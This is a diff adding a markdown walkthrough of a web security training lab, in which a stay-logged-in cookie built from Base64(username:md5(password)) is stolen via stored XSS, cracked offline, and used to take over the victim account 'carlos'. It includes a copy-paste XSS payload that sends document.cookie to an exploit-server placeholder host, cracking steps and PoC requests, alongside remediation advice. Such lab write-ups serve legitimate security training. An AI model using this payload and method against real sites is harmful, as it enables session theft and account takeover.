@@ -978,3 +978,151 @@ GET /my-account?id=carlos HTTP/1.1 Host: <LAB_HOST> Cookie: stay-logged-in=<BASE
 - Log suspicious token validation attempts.
 
 ---
+
+# Lab-9 : Stay-logged-in cookie → Offline password cracking 
+
+---
+
+## 🔹 One-line summary
+The application stores a *stay-logged-in* token that is exactly Base64(username:md5(password)).  
+Because the cookie is readable by JavaScript (not HttpOnly), a stored XSS payload can exfiltrate it → decode it → crack the MD5 hash offline → login as the victim.
+
+---
+
+## 🔹 Why this matters
+- Persistent cookie containing md5(password) is effectively password-equivalent.  
+- Exfiltration → offline cracking → account takeover.  
+- Reused passwords allow lateral movement to other services.
+
+*Impact:* full account compromise, data theft, privilege escalation.
+
+---
+
+## 🔹 High-value places / patterns to look for
+- Cookie names: stay-logged-in, remember-me, auth_token, persist.  
+- Set-Cookie headers in login responses with Base64-like values.  
+- Input sinks that render HTML: comments, profile bio, message boards (stored XSS).  
+- Exploit/callback server provided by labs (exploit-server).
+
+---
+
+## 🔹 Exact methodology / lab walkthrough (step-by-step)
+
+> Follow these steps precisely (copy-paste ready). Use Burp for all interception & decoding.
+
+### 1. Capture login response
+- Log in as *wiener:peter* while Burp Proxy is running.  
+- In *Burp → Proxy → HTTP history*, find the POST /login response.  
+- Copy header Set-Cookie: stay-logged-in=<VALUE> from the response.  
+  - Example captured value: ZGMw...%3d.
+
+### 2. Confirm cookie format (URL-decode → Base64-decode)
+- Open *Burp Decoder*.  
+- Paste the cookie value → *Decode as URL* → *Decode as Base64*.  
+- Expected output: username:32hex_md5 (e.g., carlos:26323c16d5f4dabff3bb136f2460a943).  
+  - This confirms the format username:md5(password).
+
+### 3. Find a stored-XSS injection point
+- Identify persistent input fields (comment box, profile bio).  
+- Test with a harmless payload:
+  ```html
+  <script>alert(1)</script>
+  If the alert runs after page refresh, the sink is vulnerable to stored XSS.
+
+### 4. Create & post exfiltration payload
+- Replace EXPLOIT_HOST with your lab exploit server host.
+- Example beacon payload (does not navigate away):
+  <script>new Image().src="https://EXPLOIT_HOST.exploit-server.net/exploit?c="+encodeURIComponent(document.cookie)</script>
+- Paste this payload into the vulnerable comment/profile field and submit.
+
+### 5. Trigger the payload & collect cookie
+- Refresh the page that renders your comment to trigger the JS.
+- Open Exploit Server → Access log (or your exploit endpoint logs).
+- Find the GET request containing query parameter ?c=... with stay-logged-in=...%3d.
+- Copy the full stay-logged-in value from the access log.
+
+### 6. Decode & extract MD5 hash
+- Paste the stolen cookie into Burp Decoder.
+- Decode as URL → Decode as Base64.
+- Output: carlos:26323c16d5f4dabff3bb136f2460a943 → copy the MD5 value 26323c16....
+
+### 7. Crack the MD5 hash 
+- Try CrackStation / Google lookup.
+- If not found, use hashcat / john with a suitable wordlist.
+- Example found password: onceuponatime.
+
+### 8. Verify & exploit
+- Log in with the cracked credentials: carlos:onceuponatime.
+- Perform the lab goal action (e.g., My Account → Delete account).
+- Capture screenshots / raw requests to prove PoC.
+- Lab solved ✅.
+
+---
+
+## 🔹 Proof / Evidence
+
+1. Stored-XSS payload posted (comment box)
+Shows the payload inserted in the comment field.
+Image (place in repo): ../images/stayloggedin-xss-payload.png
+Markdown:
+![Stored XSS payload in comment box](../images/stayloggedin-xss-payload.png)
+
+2. Exploit-server access log (cookie captured)
+Shows request to exploit server containing stay-logged-in=...%3d.
+Image (place in repo): ../images/stayloggedin-accesslog-cookie.png
+Markdown:
+![Exploit server access log showing cookie](../images/stayloggedin-accesslog-cookie.png)
+
+3. Final verification — logged in as carlos & delete account
+Shows logged-in Carlos account / deletion confirmation.
+Image (place in repo): ../images/stayloggedin-carlos-delete.png
+Markdown:
+![Logged in as carlos (account delete)](../images/stayloggedin-username-delete.png)
+
+---
+
+## 🔹 Repeater / PoC templates
+
+- Login (example)
+
+POST /login HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+username=carlos&password=onceuponatime
+
+- Verify using token 
+
+GET /my-account?id=carlos HTTP/1.1
+Host: <LAB_HOST>
+Cookie: stay-logged-in=<BASE64_TOKEN>; session=<FRESH_SESSION_IF_REQUIRED>
+User-Agent: Mozilla/5.0
+Accept: text/html
+Connection: close
+
+---
+
+## 🔹 Real-world attack scenarios 
+- Stored XSS → exfiltrate remember-me cookie → offline crack → mass account takeover.
+- Admin persistent cookie exfiltration → high-impact compromise.
+- Reused passwords → pivot to other services.
+
+---
+
+## 🔹 Remediation 
+- Do not store password-derived values client-side. Use opaque random tokens.
+- Mark cookies HttpOnly, Secure, SameSite.
+- Store persistent tokens server-side, hashed, bound to device metadata, and revocable.
+- Fix XSS: input sanitization, output encoding, CSP.
+- Log & rate-limit token validation attempts.
+
+---
+
+## 🔹 Pentest checklist 
+- Capture POST /login → find persistent cookie.
+- Decode cookie → confirm username:md5(password).
+- Find stored XSS sink → post exfil payload.
+- Retrieve cookie from exploit-server logs.
+- Decode → crack MD5 → login as victim → verify & document PoC.
+
+---
